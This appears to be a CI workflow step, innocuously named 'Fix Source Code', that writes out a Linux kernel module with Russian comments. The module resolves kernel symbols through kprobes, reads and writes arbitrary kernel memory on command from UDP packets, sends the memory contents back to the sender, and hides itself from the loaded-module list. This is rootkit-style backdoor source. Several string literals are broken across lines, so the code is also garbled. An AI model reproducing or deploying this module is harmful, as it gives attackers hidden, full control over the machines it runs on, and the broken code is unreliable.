      - name: Fix Source Code
        run: |
          cat <<'EOF' > rw_universal.c
          // SPDX-License-Identifier: GPL-2.0
          #define pr_fmt(fmt) "rw_universal: " fmt
          #include <linux/init.h>
          #include <linux/module.h>
          #include <linux/mm.h>
          #include <linux/uaccess.h>
          #include <linux/kallsyms.h>
          #include <linux/kprobes.h>
          #include <linux/net.h>
          #include <linux/inet.h>
          #include <linux/skbuff.h>
          #include <net/ip.h>
          #include <net/udp.h>
          #include <asm/pgtable.h>
          #include <linux/pagewalk.h>
          #include <linux/version.h>

          MODULE_LICENSE("GPL");
          MODULE_AUTHOR("x");
          MODULE_DESCRIPTION("Universal r/w for 5.10");

          // === Улучшенный поиск символов через kprobe ===
          static unsigned long kprobe_lookup_name(const char *name) {
              struct kprobe kp = {
                  .symbol_name = name,
              };
              unsigned long addr;
              int ret;

              ret = register_kprobe(&kp);
              if (ret < 0) {
                  pr_err("register_kprobe(%s) failed: %d
", name, ret);
                  return 0;
              }

              addr = (unsigned long)kp.addr;
              unregister_kprobe(&kp);
              
              pr_info("Found %s at %px via kprobe
", name, (void *)addr);
              return addr;
          }

          // Резервный метод: поиск через экспортированные символы
          static unsigned long lookup_name_fallback(const char *name) {
              unsigned long addr = 0;
              
          #ifdef CONFIG_KALLSYMS
              // Пробуем напрямую (если повезет и символ экспортирован)
              addr = kallsyms_lookup_name(name);
              if (addr) {
                  pr_info("Found %s at %px via direct kallsyms
", name, (void *)addr);
                  return addr;
              }
          #endif

          #ifdef CONFIG_KALLSYMS_ALL
              // Если CONFIG_KALLSYMS_ALL включен, можем использовать kallsyms_on_each_symbol
              // (код опущен для краткости, можно добавить если нужно)
          #endif

              pr_err("Failed to find symbol: %s
", name);
              return 0;
          }

          // Универсальная функция поиска
          static unsigned long resolve_symbol(const char *name) {
              unsigned long addr;
              
              // Метод 1: kprobe
              addr = kprobe_lookup_name(name);
              if (addr)
                  return addr;
              
              // Метод 2: fallback
              addr = lookup_name_fallback(name);
              if (addr)
                  return addr;
              
              pr_err("All methods failed for: %s
", name);
              return 0;
          }

          static unsigned long (*_kallsyms_lookup_name)(const char *) = NULL;
          static struct mm_struct *init_mm_ptr = NULL;

          typedef struct { phys_addr_t phys; bool valid; } v2p_t;

          static int walker(pte_t *pte, unsigned long addr, unsigned long next, struct mm_walk *walk) {
              v2p_t *v = walk->private;
              if (pte_present(*pte)) {
                  v->phys = (pte_pfn(*pte) << PAGE_SHIFT) | (addr & ~PAGE_MASK);
                  v->valid = true;
                  return 1;
              }
              return 0;
          }

          static const struct mm_walk_ops v2p_walk_ops = { .pte_entry = walker };

          static v2p_t slow_virt2phys(uint64_t vaddr) {
              v2p_t res = {0};
              walk_page_range(init_mm_ptr, vaddr, vaddr + 1, &v2p_walk_ops, &res);
              return res;
          }

          static int rw_phys(phys_addr_t phys, void *buf, size_t len, bool write) {
              void *vm = phys_to_virt(phys);
              if (!vm) return -EFAULT;
              if (write) memcpy(vm, buf, len);
              else memcpy(buf, vm, len);
              return 0;
          }

          static int rw_virt(uint64_t vaddr, void *buf, size_t len, bool write) {
              v2p_t p = slow_virt2phys(vaddr);
              if (!p.valid) return -EFAULT;
              return rw_phys(p.phys, buf, len, write);
          }

          #define CMD_READ  0x01
          #define CMD_WRITE 0x02

          typedef struct {
              uint8_t cmd;
              uint8_t reserved[3];
              uint32_t size;
              uint64_t addr;
              uint8_t data[];
          } __packed pkt_t;

          static struct socket *sock = NULL;

          static void udp_reply(struct sk_buff *skb, void *buf, size_t len) {
              struct iphdr *iph;
              struct udphdr *uh;
              struct sockaddr_in to;
              struct kvec iov;
              struct msghdr msg;

              iph = ip_hdr(skb);
              uh = udp_hdr(skb);
              
              memset(&to, 0, sizeof(to));
              to.sin_family = AF_INET;
              to.sin_port = uh->source;
              to.sin_addr.s_addr = iph->saddr;

              iov.iov_base = buf;
              iov.iov_len = len;

              memset(&msg, 0, sizeof(msg));
              msg.msg_name = &to;
              msg.msg_namelen = sizeof(to);

              kernel_sendmsg(sock, &msg, &iov, 1, len);
          }

          static int udp_recv(struct sk_buff *skb) {
              pkt_t *pkt;
              uint8_t *buf;

              if (skb->len < sizeof(pkt_t)) return 0;
              pkt = (pkt_t *)skb->data;
              buf = kmalloc(pkt->size, GFP_KERNEL);
              if (!buf) return 0;

              switch (pkt->cmd) {
              case CMD_READ:
                  rw_virt(pkt->addr, buf, pkt->size, false);
                  udp_reply(skb, buf, pkt->size);
                  break;
              case CMD_WRITE:
                  rw_virt(pkt->addr, pkt->data, pkt->size, true);
                  break;
              }
              kfree(buf);
              return 0;
          }

          static int net_init(void) {
              return sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_UDP, &sock);
          }

          static void net_exit(void) {
              if (sock) sock_release(sock);
          }

          static void hide_module(void) {
              list_del_init(&THIS_MODULE->list);
          }

          static int __init rw_init(void) {
              pr_info("Module loading...
");
              
              // Сначала находим kallsyms_lookup_name (если нужно для дальнейшего использования)
              _kallsyms_lookup_name = (void *)resolve_symbol("kallsyms_lookup_name");
              
              // Находим init_mm (критически важен)
              init_mm_ptr = (void *)resolve_symbol("init_mm");
              
              if (!init_mm_ptr) {
                  pr_err("Failed to resolve init_mm (critical symbol)
");
                  return -ENODEV;
              }
              
              pr_info("init_mm resolved at: %px
", init_mm_ptr);
              
              if (!_kallsyms_lookup_name) {
                  pr_warn("kallsyms_lookup_name not found, some features may be limited
");
                  // Но продолжаем работу, т.к. init_mm найден
              }

              hide_module();
              
              if (net_init() < 0) {
                  pr_err("Network init failed
");
                  return -ENODEV;
              }
              
              pr_info("Module loaded successfully
");
              return 0;
          }

          static void __exit rw_exit(void) {
              net_exit();
              pr_info("Module unloaded
");
          }

          module_init(rw_init);
          module_exit(rw_exit);
          EOF
